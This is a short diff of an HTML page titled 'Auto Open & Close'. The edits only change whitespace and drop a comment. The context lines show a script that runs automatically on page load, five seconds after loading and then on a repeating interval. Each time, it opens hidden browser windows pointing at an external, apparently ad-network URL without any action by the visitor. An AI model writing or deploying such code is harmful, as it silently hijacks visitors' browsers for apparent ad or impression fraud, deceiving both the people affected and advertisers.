@@ -3,7 +3,9 @@
 <head>
   <title>Auto Open & Close</title>
   <script>
+    
     function openHiddenWindows() {
+      
       // First URL
       const win1 = window.open(
         "https://otieu.com/4/10192002",
@@ -64,7 +66,7 @@
     }
   
     window.onload = () => {
-      setTimeout(openHiddenWindows, 5000); // small delay
+      setTimeout(openHiddenWindows, 5000); 
     };
     setInterval(() => {
       openHiddenWindows()
